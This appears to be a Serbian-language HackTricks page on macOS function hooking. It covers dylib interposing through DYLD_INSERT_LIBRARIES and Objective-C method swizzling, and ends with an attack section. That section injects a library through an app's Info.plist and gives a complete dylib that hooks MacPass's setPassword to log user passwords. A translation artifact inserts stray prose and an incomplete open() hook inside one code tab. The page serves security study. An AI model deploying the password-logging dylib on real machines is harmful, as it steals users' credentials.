# macOS Hakovanje Funkcija

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Interpolacija Funkcija

Kreirajte **dylib** sa **`__interpose`** sekcijom (ili sekcijom označenom sa **`S_INTERPOSING`**) koja sadrži tuple **pokazivača na funkcije** koji se odnose na **originalne** i **zamenske** funkcije.

Zatim, **ubacite** dylib sa **`DYLD_INSERT_LIBRARIES`** (interpolacija mora da se desi pre nego što se glavna aplikacija učita). Očigledno, [**ograničenja** primenjena na korišćenje **`DYLD_INSERT_LIBRARIES`** se takođe primenjuju ovde](macos-library-injection/#check-restrictions).

### Interpolacija printf

{% tabs %}
{% tab title="interpose.c" %}
{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{% endcode %}
{% endtab %}

{% tab title="hello.c" %}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{% endtab %}

{% tab title="interpose2.c" %} 

### macOS Funkcionalno Hakovanje

Funkcionalno hakovanje je tehnika koja omogućava zlonamernom korisniku da preuzme kontrolu nad izvršavanjem programa tako što menja ili preusmerava pozive funkcija. Ovo se može postići korišćenjem funkcije `interpose` u macOS-u.

Evo primera koda koji demonstrira kako se funkcionalno hakovanje može koristiti za preusmeravanje poziva funkcije `open` na sopstvenu funkciju `my_open`:

```c
#define _DARWIN_C_SOURCE
#include <stdio.h>
#include <dlfcn.h>

int (*original_open)(const char *, int, mode_t);

int my_open(const char *path, int flags, mode_t mode) {
    printf("Hacked open function\n");
    return original_open(path, flags, mode);
}

__attribute__((constructor))
void init() {
    original_open = dlsym(RTLD_NEXT, "open");
    if (original_open == NULL) {
        fprintf(stderr, "Error in `dlsym`: %s\n", dlerror());
    }
    printf("Original open function address: %p\n", original_open);
    rebind_symbols((struct rebinding[]){{"open", my_open, (void *)&original_open}}, 1);
}
```

U ovom primeru, funkcija `my_open` se koristi za preusmeravanje poziva funkcije `open`, a zatim se poziva originalna funkcija `open` sa istim argumentima.

Ova tehnika može biti korisna za različite svrhe, uključujući praćenje ili manipulaciju sistema. Međutim, važno je napomenuti da je funkcionalno hakovanje moćan alat koji može biti zloupotrebljen u nelegalne svrhe.
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{% endtab %}
{% endtabs %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
## Zamena metoda

U ObjectiveC-u se metoda poziva na sledeći način: **`[mojObjekatIme imeMetodePrviParam:param1 drugiParam:param2]`**

Potrebni su **objekat**, **metoda** i **parametri**. Kada se metoda pozove, **poruka se šalje** koristeći funkciju **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(nekiObjekat, @selector(metoda1p1:p2:), vrednost1, vrednost2);`

Objekat je **`nekiObjekat`**, metoda je **`@selector(metoda1p1:p2:)`** a argumenti su **vrednost1**, **vrednost2**.

Prateći strukture objekata, moguće je doći do **niza metoda** gde su **imena** i **pokazivači** na kod metoda **locirani**.

{% hint style="danger" %}
Imajte na umu da se zbog toga što se metode i klase pristupaju na osnovu njihovih imena, ove informacije se čuvaju u binarnom obliku, pa je moguće doći do njih korišćenjem `otool -ov </putanja/bin>` ili [`class-dump </putanja/bin>`](https://github.com/nygard/class-dump)
{% endhint %}

### Pristupanje sirovim metodama

Moguće je pristupiti informacijama o metodama kao što su ime, broj parametara ili adresa kao u sledećem primeru:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Zamena metoda pomoću method\_exchangeImplementations

Funkcija **`method_exchangeImplementations`** omogućava **promenu** adrese **implementacije** jedne funkcije za drugu.

{% hint style="danger" %}
Dakle, kada se pozove funkcija, izvršava se **druga funkcija**.
{% endhint %}
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
{% hint style="warning" %}
U ovom slučaju, ako **implementacioni kod legitimne** metode **proverava** **ime metode**, mogao bi **detektovati** ovu zamenu i sprečiti je da se izvrši.

Sledeća tehnika nema ovu restrikciju.
{% endhint %}

### Zamena metoda pomoću method\_setImplementation

Prethodni format je čudan jer menjate implementaciju 2 metode jednu drugom. Korišćenjem funkcije **`method_setImplementation`** možete **promeniti implementaciju** jedne **metode za drugu**.

Samo zapamtite da **sačuvate adresu implementacije originalne metode** ako ćete je pozvati iz nove implementacije pre nego što je prepišete, jer će kasnije biti mnogo komplikovanije locirati tu adresu.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Metodologija napada pomoću kvačenja funkcija

Na ovoj stranici razmatrane su različite metode kvačenja funkcija. Međutim, one uključuju **izvršavanje koda unutar procesa radi napada**.

Da biste to uradili, najlakša tehnika koju možete koristiti je ubacivanje [Dyld putem promenljivih okruženja ili preuzimanje kontrole](macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md). Međutim, pretpostavljam da se to takođe može uraditi putem [Dylib procesnog ubacivanja](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port).

Međutim, oba opcije su **ograničena** na **nezaštićene** binarne fajlove/procese. Proverite svaku tehniku da biste saznali više o ograničenjima.

Međutim, napad kvačenja funkcija je vrlo specifičan, napadač će to uraditi da bi **ukrao osetljive informacije iznutra procesa** (ako ne biste samo izvršili napad ubacivanja procesa). A ove osetljive informacije mogu se nalaziti u aplikacijama koje je korisnik preuzeo, poput MacPass-a.

Stoga bi vektor napada bio da napadač ili pronađe ranjivost ili ukloni potpis aplikacije, ubaci **`DYLD_INSERT_LIBRARIES`** env promenljivu putem Info.plist fajla aplikacije dodajući nešto poput:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
i zatim **ponovo registrujte** aplikaciju:

{% code overflow="wrap" %}
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
{% endcode %}

Dodajte u tu biblioteku kod za hakovanje kako biste izvukli informacije: Lozinke, poruke...

{% hint style="danger" %}
Imajte na umu da u novijim verzijama macOS-a, ako **uklonite potpis** aplikacionog binarnog fajla i ako je prethodno izvršen, macOS više **neće izvršavati aplikaciju**.
{% endhint %}

#### Primer biblioteke
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Reference

* [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
